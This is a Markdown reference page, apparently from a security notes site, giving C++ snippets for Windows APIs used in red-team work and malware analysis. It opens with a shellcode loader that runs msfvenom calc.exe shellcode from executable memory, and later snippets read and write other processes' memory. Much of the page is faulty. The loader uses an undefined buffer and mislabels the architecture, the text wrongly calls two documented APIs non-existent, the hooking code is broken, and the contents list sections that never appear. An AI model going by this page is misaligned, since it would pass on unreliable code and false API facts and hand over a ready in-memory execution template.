---
layout: attack
title: Offensive Windows API
---

<img height="150" align="left" src="/images/red-windows-api.png"> Compilation of the main Windows APIs for use in PenTest, Red Team operations and Malware Analysis. These APIs and snippets are mainly part from some investigations and learnings, mostly related to casual "malware combos". The code is meant for educational purposes only and form a baseline for further studying of the Windows API.

A great resource into common combos and APIs is [VX-API](https://github.com/vxunderground/VX-API) from [VX-Underground](https://vx-underground.org/).Most of the API described below were taken from three or learn Microsoft.

<!-- cSpell:disable -->
- [Basic Shell Loader Combo](#basic-shell-loader-combo)
- [CreateToolhelp32Snapshot](#createtoolhelp32snapshot)
  - [Code Example](#code-example)
- [GetModuleFileName](#getmodulefilename)
  - [Code Example](#code-example-1)
- [ShellExecuteEx](#shellexecuteex)
  - [Code Example](#code-example-2)
- [GetTokenInformation](#gettokeninformation)
  - [Code Example](#code-example-3)
- [AdjustTokenPrivileges](#adjusttokenprivileges)
  - [Code Example](#code-example-4)
- [Toolhelp32ReadProcessMemory](#toolhelp32readprocessmemory)
  - [Code Example](#code-example-5)
- [WriteProcessMemory](#writeprocessmemory)
  - [Code Example](#code-example-6)
- [WTSEnumerateProcessesEx](#wtsenumerateprocessesex)
  - [Code Example](#code-example-7)
- [WTSFreeMemoryEx](#wtsfreememoryex)
  - [Code Example](#code-example-8)
- [LookupPrivilegeValue](#lookupprivilegevalue)
  - [Code Example](#code-example-9)
- [GetCurrentProcess](#getcurrentprocess)
  - [Code Example](#code-example-10)
- [OpenProcessToken](#openprocesstoken)
  - [Code Example](#code-example-11)
- [LookupAccountSid](#lookupaccountsid)
  - [Code Example](#code-example-12)
- [ConvertSidToStringSidA](#convertsidtostringsida)
  - [Code Example](#code-example-13)
- [MessageBoxA](#messageboxa)
  - [Code Example](#code-example-14)
- [HookedMessageBox](#hookedmessagebox)
  - [Code Example](#code-example-15)
- [GetProcAddress](#getprocaddress)
  - [Code Example](#code-example-16)
- [CreateProcessA](#createprocessa)
  - [Code Example](#code-example-17)
- [OpenProcess](#openprocess)
  - [Code Example](#code-example-18)
- [DuplicateHandle](#duplicatehandle)
  - [Code Example](#code-example-19)
- [VirtualAllocEx](#virtualallocex)
  - [Code Example](#code-example-20)
- [VirtualProtectEx](#virtualprotectex)
  - [Code Example](#code-example-21)
- [SetThreadContext](#setthreadcontext)
  - [Code Example](#code-example-22)
- [QueueUserAPC](#queueuserapc)
  - [Code Example](#code-example-23)
- [CreateRemoteThread](#createremotethread)
  - [Code Example](#code-example-24)


## Basic Shell Loader Combo

```cpp
#include <stdio.h>
#include <Windows.h>

/// <summary>
/// msfvenom --platform windows --arch x64  -p windows/x64/exec CMD=calc.exe -f c
/// </summary>

// 32 bit calc shellcode 193 bytes be sure to change it in virtualalloc and memcpy function
unsigned char buf[] =
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50"
"\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26"
"\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7"
"\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78"
"\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3"
"\x3a\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"
"\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58"
"\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3"
"\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a"
"\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x01\x8d"
"\x85\xb2\x00\x00\x00\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb"
"\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x06\x7c"
"\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x53"
"\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

int main() {
    //creating pshellcode virtualmemory 

    // we should use size from msfvenom output

    LPVOID pshellcode = VirtualAlloc(NULL, 193, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    //HANDLE CreateThread(
    //    [in, optional]  LPSECURITY_ATTRIBUTES   lpThreadAttributes,
    //    [in]            SIZE_T                  dwStackSize,
    //    [in]            LPTHREAD_START_ROUTINE  lpStartAddress,
    //    [in, optional]  __drv_aliasesMem LPVOID lpParameter,
    //    [in]            DWORD                   dwCreationFlags,
    //    [out, optional] LPDWORD                 lpThreadId
    //);

    //LPVOID pshellcode = VirtualAlloc(NULL, 276, MEM_COMMIT | MEM_RESERVE, PAGE_READONLY);
    // Copying buf to pshellcode section
    
    memcpy(pshellcode, buf2, 193);
    
    // Now Creating Thread 
    //getchar();
    CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)pshellcode, NULL, NULL, NULL);
    //CreateProcess() homework

    
    // In order to thread stay allive we should use getchar function. 
    getchar();

    return 0;
}
```

<!-- cSpell:disable -->

## CreateToolhelp32Snapshot 

The CreateToolhelp32Snapshot API is frequently utilized in C++ programming for enumerating processes and modules on Windows systems. While it is not specifically designed for cybersecurity or penetration testing, it can still be valuable for obtaining information about running processes, making it useful in security-related scenarios.

[Learn Microsoft Link](https://learn.microsoft.com/de-de/windows/win32/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot)

### Code Example 

```cpp
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>

int main() {
    //Create a snapshot of running processes
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        std::cerr << "Erro ao criar o snapshot: " << GetLastError() << std::endl;
        return 1;
    }

    // Structure for storing information about a process
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // Initialize the loop to enumerate the processes
    if (Process32First(hSnapshot, &pe32)) {
        do {
            std::cout << "Processo ID: " << pe32.th32ProcessID << std::endl;
            std::cout << "Nome do processo: " << pe32.szExeFile << std::endl;
        } while (Process32Next(hSnapshot, &pe32));
    } else {
        std::cerr << "Erro ao enumerar processos: " << GetLastError() << std::endl;
    }

    // Close the snapshot
    CloseHandle(hSnapshot);

    return 0;
}
```

## GetModuleFileName


The GetModuleFileName API in C++ is generally employed to obtain the full path of a running process's executable file. Though not specifically tailored for cybersecurity or penetration testing, it can be beneficial in these areas for collecting information about active processes on a system.

Here’s a straightforward C++ code example illustrating how to use the GetModuleFileName API to retrieve the full path of an executable for a given process using its Process ID (PID). This information can be crucial in security auditing and process monitoring contexts.

[Learn Microsoft Link](https://learn.microsoft.com/de-de/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulefilenamea)

### Code Example

```cpp
#include <windows.h>
#include <iostream>

int main() {
    DWORD processId; // Replace with the target process ID
    HANDLE hProcess;

    // Replace 'processId' with the PID of the target process
    processId = 1234; // Example PID

    // Open the target process with PROCESS_QUERY_INFORMATION and PROCESS_VM_READ access rights
    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);

    if (hProcess == NULL) {
        std::cerr << "Failed to open the target process. Error code: " << GetLastError() << std::endl;
        return 1;
    }

    char szPath[MAX_PATH];
    DWORD dwSize = GetModuleFileNameExA(hProcess, NULL, szPath, MAX_PATH);

    if (dwSize == 0) {
        std::cerr << "Failed to get module filename. Error code: " << GetLastError() << std::endl;
        CloseHandle(hProcess);
        return 1;
    }

    std::cout << "Full path of the executable: " << szPath << std::endl;

    // Close the process handle
    CloseHandle(hProcess);

    return 0;
}
```

## ShellExecuteEx 

The ShellExecuteEx API in C++ is frequently utilized to launch external applications and perform various file-related operations. Although it is not specifically designed for cybersecurity or penetration testing, it can be leveraged in these fields for scripting or automation tasks, such as opening specific files or URLs during an assessment. Here’s a simple example of using ShellExecuteEx to open a web page.

[Learn Microsoft Link](https://learn.microsoft.com/de-de/windows/win32/api/shellapi/nf-shellapi-shellexecuteexa)

### Code Example

```cpp
#include <windows.h>
#include <iostream>

int main() {
    SHELLEXECUTEINFO shellInfo = {0};
    shellInfo.cbSize = sizeof(SHELLEXECUTEINFO);
    shellInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
    shellInfo.lpFile = L"https://www.example.com"; // Replace with the URL you want to open
    shellInfo.lpVerb = L"open";
    shellInfo.nShow = SW_SHOWNORMAL;

    if (ShellExecuteEx(&shellInfo)) {
        WaitForSingleObject(shellInfo.hProcess, INFINITE);
        CloseHandle(shellInfo.hProcess);
        std::cout << "Web page opened successfully!" << std::endl;
    } else {
        std::cerr << "Failed to open the web page. Error code: " << GetLastError() << std::endl;
        return 1;
    }

    return 0;
}
```

In this example, ShellExecuteEx is used to open a web page (https://www.example.com) with the default web browser. The SEE_MASK_NOCLOSEPROCESS flag is set to obtain a handle to the launched process, and WaitForSingleObject is used to wait for the process to complete.

## GetTokenInformation 

The GetTokenInformation API in C++ is utilized to obtain details about a security token linked to a process or thread. This can be particularly useful in cybersecurity and penetration testing for gathering information about the privileges, groups, or other attributes of a user's access token. Below is an example of how to use GetTokenInformation to retrieve the groups a user belongs to:

[Learn Microsoft Link](https://learn.microsoft.com/de-de/windows/win32/api/securitybaseapi/nf-securitybaseapi-gettokeninformation)

### Code Example

```cpp
#include <windows.h>
#include <iostream>

int main() {
    HANDLE hToken = NULL;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        std::cerr << "OpenProcessToken failed. Error code: " << GetLastError() << std::endl;
        return 1;
    }

    DWORD dwSize = 0;
    GetTokenInformation(hToken, TokenGroups, NULL, 0, &dwSize);

    if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
        std::cerr << "GetTokenInformation failed (1). Error code: " << GetLastError() << std::endl;
        CloseHandle(hToken);
        return 1;
    }

    PTOKEN_GROUPS pGroups = reinterpret_cast<PTOKEN_GROUPS>(new BYTE[dwSize]);

    if (!GetTokenInformation(hToken, TokenGroups, pGroups, dwSize, &dwSize)) {
        std::cerr << "GetTokenInformation failed (2). Error code: " << GetLastError() << std::endl;
        delete[] pGroups;
        CloseHandle(hToken);
        return 1;
    }

    std::cout << "Token Groups:" << std::endl;
    for (DWORD i = 0; i < pGroups->GroupCount; ++i) {
        SID_NAME_USE sidType;
        WCHAR szName[256];
        DWORD cchName = sizeof(szName) / sizeof(szName[0]);
        if (LookupAccountSidW(NULL, pGroups->Groups[i].Sid, szName, &cchName, NULL, NULL, &sidType)) {
            std::wcout << L"Group " << i + 1 << L": " << szName << std::endl;
        }
    }

    delete[] pGroups;
    CloseHandle(hToken);

    return 0;
}
```


We begin by opening the access token associated with the current process using OpenProcessToken.

Initially, we call GetTokenInformation with a NULL buffer to determine the necessary buffer size (dwSize). Next, we allocate memory for the token information structure based on this size.

Subsequently, we call GetTokenInformation again to retrieve the token groups information.

Finally, we iterate through the token groups, using LookupAccountSidW to convert each group's SID into a human-readable name and display it.

## AdjustTokenPrivileges 


The AdjustTokenPrivileges API in C++ is utilized to enable or disable privileges in an access token. It is often employed in cybersecurity and penetration testing contexts when it is necessary to adjust privileges to execute specific actions with elevated permissions. Here’s an example of using AdjustTokenPrivileges to enable a privilege for the current process:

[Learn Microsoft Link](https://learn.microsoft.com/de-de/windows/win32/api/securitybaseapi/nf-securitybaseapi-adjusttokenprivileges)

### Code Example

```cpp
#include <windows.h>
#include <iostream>

int main() {
    HANDLE hToken = NULL;

    // Open the access token for the current process with TOKEN_ADJUST_PRIVILEGES privilege
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        std::cerr << "OpenProcessToken failed. Error code: " << GetLastError() << std::endl;
        return 1;
    }

    // Specify the privilege to enable (e.g., SE_DEBUG_NAME)
    LUID luid;
    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
        std::cerr << "LookupPrivilegeValue failed. Error code: " << GetLastError() << std::endl;
        CloseHandle(hToken);
        return 1;
    }

    // Prepare the TOKEN_PRIVILEGES structure
    TOKEN_PRIVILEGES tp;
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    // Adjust the token privileges
    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
        std::cerr << "AdjustTokenPrivileges failed. Error code: " << GetLastError() << std::endl;
        CloseHandle(hToken);
        return 1;
    }

    if (GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
        std::cerr << "The token does not have the specified privilege." << std::endl;
    } else {
        std::cout << "The privilege has been enabled." << std::endl;
    }

    CloseHandle(hToken);
    
    return 0;
}
```

## Toolhelp32ReadProcessMemory 

Toolhelp32ReadProcessMemory is not a standard or recognized Windows API function. It seems to be a confusion or combination of two distinct functions: Toolhelp32Snapshot and ReadProcessMemory.

To read the memory of a different process for cybersecurity or penetration testing purposes, you can use ReadProcessMemory. Here’s an example of how to use ReadProcessMemory to read the memory of another process:

[Learn Microsoft Link](https://learn.microsoft.com/en-us/windows/win32/api/tlhelp32/nf-tlhelp32-toolhelp32readprocessmemory)

### Code Example

```cpp
#include <windows.h>
#include <iostream>

int main() {
    DWORD processId; // Replace with the target process ID
    HANDLE hProcess;

    // Replace 'processId' with the PID of the target process
    processId = 1234; // Example PID

    // Open the target process with PROCESS_VM_READ access rights
    hProcess = OpenProcess(PROCESS_VM_READ, FALSE, processId);

    if (hProcess == NULL) {
        std::cerr << "Failed to open the target process. Error code: " << GetLastError() << std::endl;
        return 1;
    }

    // Define a buffer to store the read data
    SIZE_T bytesRead;
    DWORD address = 0x12345678; // Replace with the memory address you want to read
    DWORD buffer;

    // Read memory from the target process
    if (ReadProcessMemory(hProcess, (LPCVOID)address, &buffer, sizeof(DWORD), &bytesRead)) {
        std::cout << "Read value at address " << std::hex << address << ": " << std::dec << buffer << std::endl;
    } else {
        std::cerr << "ReadProcessMemory failed. Error code: " << GetLastError() << std::endl;
    }

    // Close the handle to the target process
    CloseHandle(hProcess);

    return 0;
}

```

## WriteProcessMemory 

The WriteProcessMemory API in C++ is used to write data to the memory of another process. This can be useful in cybersecurity and penetration testing contexts when there is a need to modify or inject code into another process. It is important to note that altering another process's memory can have legal and ethical implications, so this API should be used responsibly and with proper authorization.

Here’s an example of using WriteProcessMemory to write a value to the memory of another process:

[Learn Microsoft Link](https://learn.microsoft.com/de-de/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)

### Code Example

```cpp
#include <windows.h>
#include <iostream>

int main() {
    DWORD processId; // Replace with the target process ID
    HANDLE hProcess;

    // Replace 'processId' with the PID of the target process
    processId = 1234; // Example PID

    // Open the target process with PROCESS_VM_WRITE and PROCESS_VM_OPERATION access rights
    hProcess = OpenProcess(PROCESS_VM_WRITE | PROCESS_VM_OPERATION, FALSE, processId);

    if (hProcess == NULL) {
        std::cerr << "Failed to open the target process. Error code: " << GetLastError() << std::endl;
        return 1;
    }

    DWORD address = 0x12345678; // Replace with the memory address you want to write to
    DWORD value = 42; // Replace with the value you want to write

    // Write the value to the memory of the target process
    SIZE_T bytesWritten;
    if (WriteProcessMemory(hProcess, (LPVOID)address, &value, sizeof(DWORD), &bytesWritten)) {
        if (bytesWritten == sizeof(DWORD)) {
            std::cout << "Successfully wrote value " << value << " to address " << std::hex << address << std::endl;
        } else {
            std::cerr << "Partial write: " << bytesWritten << " bytes written instead of " << sizeof(DWORD) << std::endl;
        }
    } else {
        std::cerr << "WriteProcessMemory failed. Error code: " << GetLastError() << std::endl;
    }

    // Close the handle to the target process
    CloseHandle(hProcess);

    return 0;
}
```

## WTSEnumerateProcessesEx

WTSEnumerateProcessesEx is an API designed to list processes on a Windows Terminal Server. Primarily used for administrative tasks rather than cybersecurity or penetration testing, it can still be employed to gather information about active processes on a remote server, which may be pertinent for certain security evaluations. To utilize this API, ensure the inclusion of the wtsapi32.lib library.

Here’s an example demonstrating how to use WTSEnumerateProcessesEx to enumerate processes on a remote Terminal Server:

[Learn Microsoft Link](https://learn.microsoft.com/en-us/windows/win32/api/wtsapi32/nf-wtsapi32-wtsenumerateprocessesexa)

### Code Example

```cpp
#include <windows.h>
#include <wtsapi32.h>
#include <iostream>

int main() {
    PWTS_PROCESS_INFO_EX pProcessInfo = NULL;
    DWORD dwProcCount = 0;
    
    if (WTSEnumerateProcessesEx(WTS_CURRENT_SERVER_HANDLE, &pProcessInfo, &dwProcCount) != 0) {
        for (DWORD i = 0; i < dwProcCount; ++i) {
            std::wcout << L"Process ID: " << pProcessInfo[i].ProcessId << std::endl;
            std::wcout << L"Session ID: " << pProcessInfo[i].SessionId << std::endl;
            std::wcout << L"Process Name: " << pProcessInfo[i].pProcessName << std::endl;
            std::wcout << L"User Name: " << pProcessInfo[i].pUserSid << std::endl;
            std::wcout << L"--------------------------------------" << std::endl;
        }

        // Free the allocated memory
        WTSFreeMemory(pProcessInfo);
    } else {
        std::cerr << "WTSEnumerateProcessesEx failed. Error code: " << GetLastError() << std::endl;
        return 1;
    }

    return 0;
}
```

## WTSFreeMemoryEx 

Frees memory that contains WTS_PROCESS_INFO_EX or WTS_SESSION_INFO_1 structures allocated by a Remote Desktop Services function.THis function can be used to generate proxy functions related to DLL proxying. An example can be found in [Accenture/Spartacus](https://github.com/Accenture/Spartacus)

So far, there is no standard Windows API function named WTSFreeMemoryEx. Therefore,it's hard to provide a valid C++ code example for this specific API.

[Learn Microsoft Link](https://learn.microsoft.com/en-us/windows/win32/api/wtsapi32/nf-wtsapi32-wtsfreememoryexa)

### Code Example

```cpp
BOOL WTSFreeMemoryExA(
  [in] WTS_TYPE_CLASS WTSTypeClass,
  [in] PVOID          pMemory,
  [in] ULONG          NumberOfEntries
);
```

## LookupPrivilegeValue 

The LookupPrivilegeValue API in C++ is utilized for obtaining the locally unique identifier (LUID) associated with a privilege name on a given system. This functionality is particularly useful in cybersecurity and penetration testing scenarios where managing privileges—such as enabling or disabling them for specific processes—is necessary. Below is an illustration demonstrating how LookupPrivilegeValue can be employed to fetch the LUID corresponding to a privilege:

[Learn Microsoft Link](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-lookupprivilegevaluea)

### Code Example

```cpp
#include <windows.h>
#include <iostream>

int main() {
    LUID luid;
    if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid)) {
        std::cout << "LUID for SE_DEBUG_NAME: " << std::dec << luid.LowPart << ":" << luid.HighPart << std::endl;
    } else {
        std::cerr << "LookupPrivilegeValue failed. Error code: " << GetLastError() << std::endl;
        return 1;
    }

    return 0;
}
```

We use LookupPrivilegeValue to obtain the LUID associated with the privilege named SE_DEBUG_NAME. This privilege is commonly utilized in debugging contexts and serves as an illustrative example of a privilege name.

Upon successful execution of the function, it provides the LUID for the specified privilege, which comprises two components: LowPart and HighPart. We display these values using std::cout.

In case LookupPrivilegeValue encounters an error, we output an error message that includes the error code retrieved from GetLastError().

## GetCurrentProcess 

The GetCurrentProcess API in C++ is a straightforward function designed to retrieve a handle to the current process. Although it may not be directly utilized in cybersecurity or penetration testing contexts, it can still be employed to gather details about the current process or execute specific operations related to it. Here is a basic example demonstrating the usage of GetCurrentProcess:

[Learn Microsoft Link](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getcurrentprocess)

### Code Example

```cpp
#include <windows.h>
#include <iostream>

int main() {
    HANDLE hProcess = GetCurrentProcess();

    if (hProcess == NULL) {
        std::cerr << "GetCurrentProcess failed. Error code: " << GetLastError() << std::endl;
        return 1;
    }

    std::cout << "Handle to the current process: " << hProcess << std::endl;

    // Do further operations with the process handle if needed

    // Close the handle when done with it
    CloseHandle(hProcess);

    return 0;
}
```

## OpenProcessToken

The OpenProcessToken API in C++ is frequently employed in cybersecurity and penetration testing to acquire a handle to the access token linked with a process. Access tokens hold crucial details about a user's security context, encompassing privileges, groups, and user rights. Here is an illustration demonstrating how to utilize OpenProcessToken:

[Learn Microsoft Link](https://learn.microsoft.com/de-de/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocesstoken)

### Code Example

```cpp
#include <windows.h>
#include <iostream>

int main() {
    DWORD processId; // Replace with the target process ID
    HANDLE hProcess, hToken;

    // Replace 'processId' with the PID of the target process
    processId = 1234; // Example PID

    // Open the target process with PROCESS_QUERY_INFORMATION access rights
    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, processId);

    if (hProcess == NULL) {
        std::cerr << "Failed to open the target process. Error code: " << GetLastError() << std::endl;
        return 1;
    }

    // Open the access token associated with the target process
    if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
        std::cerr << "OpenProcessToken failed. Error code: " << GetLastError() << std::endl;
        CloseHandle(hProcess);
        return 1;
    }

    // Use the access token as needed (e.g., querying privileges or groups)

    // Close the process and token handles when done
    CloseHandle(hToken);
    CloseHandle(hProcess);

    return 0;
}
```

## LookupAccountSid

The LookupAccountSid API in C++ is employed to translate a security identifier (SID) into a user or group name. This functionality proves useful in cybersecurity and penetration testing scenarios where identifying the user or group linked to a SID is necessary. Here's an example demonstrating how to utilize LookupAccountSid:

[Learn Microsoft Link](https://learn.microsoft.com/de-de/windows/win32/api/winbase/nf-winbase-lookupaccountsida)

### Code Example

```cpp
#include <windows.h>
#include <iostream>
#include <sddl.h>

int main() {
    // Replace this string with the SID you want to look up
    LPCWSTR sidString = L"S-1-5-21-3623811015-3361044348-30300820-1013";

    PSID pSid = NULL;
    if (!ConvertStringSidToSidW(sidString, &pSid)) {
        std::cerr << "ConvertStringSidToSidW failed. Error code: " << GetLastError() << std::endl;
        return 1;
    }

    WCHAR szName[MAX_PATH];
    DWORD cchName = sizeof(szName) / sizeof(szName[0]);
    WCHAR szDomain[MAX_PATH];
    DWORD cchDomain = sizeof(szDomain) / sizeof(szDomain[0]);
    SID_NAME_USE sidType;

    if (LookupAccountSidW(NULL, pSid, szName, &cchName, szDomain, &cchDomain, &sidType)) {
        std::wcout << L"User/Group Name: " << szDomain << L"\\" << szName << std::endl;
    } else {
        std::cerr << "LookupAccountSidW failed. Error code: " << GetLastError() << std::endl;
    }

    LocalFree(pSid);

    return 0;
}
```

## ConvertSidToStringSidA 

The ConvertSidToStringSidA API in C++ is utilized to transform a security identifier (SID) into a string format. This function is valuable in cybersecurity and penetration testing for tasks such as displaying or manipulating SIDs in a format that is readable by humans. Here's an example illustrating the usage of ConvertSidToStringSidA:

[Learn Microsoft Link](https://learn.microsoft.com/de-de/windows/win32/api/sddl/nf-sddl-convertsidtostringsida)

### Code Example

```cpp
#include <windows.h>
#include <iostream>

int main() {
    // Replace this string with the SID you want to convert
    const char* sidString = "S-1-5-21-3623811015-3361044348-30300820-1013";

    PSID pSid = NULL;
    if (!ConvertStringSidToSidA(sidString, &pSid)) {
        std::cerr << "ConvertStringSidToSidA failed. Error code: " << GetLastError() << std::endl;
        return 1;
    }

    LPSTR stringSid = NULL;
    if (ConvertSidToStringSidA(pSid, &stringSid)) {
        std::cout << "String representation of SID: " << stringSid << std::endl;
        LocalFree(stringSid); // Free the allocated memory
    } else {
        std::cerr << "ConvertSidToStringSidA failed. Error code: " << GetLastError() << std::endl;
    }

    LocalFree(pSid); // Free the SID structure

    return 0;
}
```

## MessageBoxA

The MessageBoxA API in C++ is employed to show a message box dialog within the Windows operating system. While it's not typically utilized directly for cybersecurity or penetration testing tasks, message boxes serve various purposes, such as presenting alerts or information during testing scenarios. Here's an example demonstrating the usage of MessageBoxA to display a basic message box:

[Learn Microsoft Link](https://learn.microsoft.com/de-de/windows/win32/api/winuser/nf-winuser-messageboxa)

### Code Example

```cpp
#include <windows.h>

int main() {
    // Display a message box with a "Hello, World!" message
    MessageBoxA(NULL, "Hello, World!", "Message Box Example", MB_OK | MB_ICONINFORMATION);

    return 0;
}
```

## HookedMessageBox 

Developing a HookedMessageBox API from scratch entails creating a customized message box function using hooking techniques, which can be intricate. Hooking involves intercepting and adjusting the behavior of established functions, making it a specialized area within software development. It's commonly utilized for debugging, monitoring, or tailoring system operations.

Here's a simplified illustration showcasing how function hooking could be used to intercept and modify the behavior of the MessageBoxA function. It's important to note that this example serves to demonstrate the concept of hooking and isn't intended for cybersecurity or penetration testing applications:

[Learn Microsoft Link](https://learn.microsoft.com/en-us/archive/msdn-magazine/2002/november/cutting-edge-using-windows-hooks-to-enhance-messagebox-in-net)

### Code Example

```cpp
#include <windows.h>
#include <iostream>

// Function pointer type for the original MessageBoxA function
typedef int(WINAPI* MessageBoxAType)(HWND, LPCSTR, LPCSTR, UINT);

// Function pointer to store the address of the original MessageBoxA function
MessageBoxAType originalMessageBoxA;

// Custom MessageBoxA function that intercepts and modifies the behavior
int WINAPI CustomMessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType) {
    // Modify the message or behavior here
    std::cout << "Intercepted MessageBoxA:" << std::endl;
    std::cout << "Text: " << lpText << std::endl;
    std::cout << "Caption: " << lpCaption << std::endl;

    // Call the original MessageBoxA function
    return originalMessageBoxA(hWnd, lpText, lpCaption, uType);
}

int main() {
    // Get the address of the original MessageBoxA function
    HMODULE user32Module = GetModuleHandle(L"user32.dll");
    if (user32Module != NULL) {
        originalMessageBoxA = reinterpret_cast<MessageBoxAType>(GetProcAddress(user32Module, "MessageBoxA"));
    }

    // Check if we successfully obtained the original function pointer
    if (originalMessageBoxA == NULL) {
        std::cerr << "Failed to obtain the address of MessageBoxA." << std::endl;
        return 1;
    }

    // Set our custom MessageBoxA function as the hook
    MessageBoxAType customMessageBoxA = CustomMessageBoxA;
    originalMessageBoxA = reinterpret_cast<MessageBoxAType>(
        SetWindowsHookEx(WH_CBT, reinterpret_cast<HOOKPROC>(customMessageBoxA), NULL, GetCurrentThreadId())
    );

    if (originalMessageBoxA == NULL) {
        std::cerr << "Failed to set the hook." << std::endl;
        return 1;
    }

    // Trigger a MessageBoxA call to see the interception
    MessageBoxA(NULL, "Hello, World!", "Original MessageBoxA", MB_OK);

    // Remove the hook
    UnhookWindowsHookEx(reinterpret_cast<HHOOK>(originalMessageBoxA));

    return 0;
}
```

We create a custom MessageBoxA function (CustomMessageBoxA) that intercepts and adjusts the behavior of the original MessageBoxA function. In this instance, it first outputs the message and caption to the console before invoking the original function.

To acquire the address of the original MessageBoxA function, we utilize GetProcAddress.

Using SetWindowsHookEx, we establish our custom function as a hook for MessageBoxA. This intercepts calls to MessageBoxA and directs them to our customized implementation.

We invoke MessageBoxA to activate the hook and showcase the interception.

Lastly, we remove the hook using UnhookWindowsHookEx.

## GetProcAddress 

The GetProcAddress API in C++ is employed to fetch the address of an exported function or variable from a dynamic-link library (DLL) or executable (EXE). This functionality is relevant in cybersecurity and penetration testing for examining available functions and potentially identifying vulnerabilities or weaknesses within a targeted application. Here's an example illustrating the usage of GetProcAddress:

[Learn Microsoft Link](https://learn.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress)

### Code Example

```cpp
#include <windows.h>
#include <iostream>

int main() {
    // Replace these values with the target DLL and function names
    const char* dllName = "user32.dll";
    const char* functionName = "MessageBoxA";

    // Load the target DLL
    HMODULE hModule = LoadLibraryA(dllName);

    if (hModule == NULL) {
        std::cerr << "Failed to load the DLL. Error code: " << GetLastError() << std::endl;
        return 1;
    }

    // Get the address of the function
    FARPROC functionAddress = GetProcAddress(hModule, functionName);

    if (functionAddress == NULL) {
        std::cerr << "Failed to get the address of the function. Error code: " << GetLastError() << std::endl;
        FreeLibrary(hModule);
        return 1;
    }

    std::cout << "Address of " << functionName << " in " << dllName << ": " << functionAddress << std::endl;

    // Free the loaded DLL
    FreeLibrary(hModule);

    return 0;
}
```

## CreateProcessA

The CreateProcessA API in C++ is frequently utilized for initiating a new process. This functionality proves valuable in cybersecurity and penetration testing scenarios when there is a need to start a fresh process, such as executing external tools or running commands within the system. Here's an example demonstrating the usage of CreateProcessA:

[Learn Microsoft Link](https://learn.microsoft.com/de-de/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa)

### Code Example

```cpp
#include <windows.h>
#include <iostream>

int main() {
    // Replace these values with the path to the executable and command-line arguments
    const char* executablePath = "C:\\Path\\To\\YourProgram.exe";
    const char* commandLineArgs = ""; // Optional command-line arguments

    // Structure for process information
    PROCESS_INFORMATION pi;
    
    // Structure for startup information
    STARTUPINFOA si;
    ZeroMemory(&si, sizeof(STARTUPINFOA));
    si.cb = sizeof(STARTUPINFOA);

    if (CreateProcessA(
        NULL,               // Use the application name from the command line
        (LPSTR)executablePath, // Path to the executable
        NULL,               // Process handle not inheritable
        NULL,               // Thread handle not inheritable
        FALSE,              // Set handle inheritance to FALSE
        0,                  // No creation flags
        NULL,               // Use parent's environment block
        NULL,               // Use parent's starting directory 
        &si,                // Pointer to STARTUPINFO structure
        &pi                 // Pointer to PROCESS_INFORMATION structure
    )) {
        std::cout << "Process created successfully!" << std::endl;
        std::cout << "Process ID: " << pi.dwProcessId << std::endl;
        
        // Close process and thread handles to avoid resource leaks
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        std::cerr << "CreateProcessA failed. Error code: " << GetLastError() << std::endl;
        return 1;
    }

    return 0;
}
```


Substitute executablePath with the path to the executable you intend to execute, and commandLineArgs with any optional command-line arguments.

We define a STARTUPINFOA structure to specify how the process should begin, and a PROCESS_INFORMATION structure to collect details about the newly launched process.

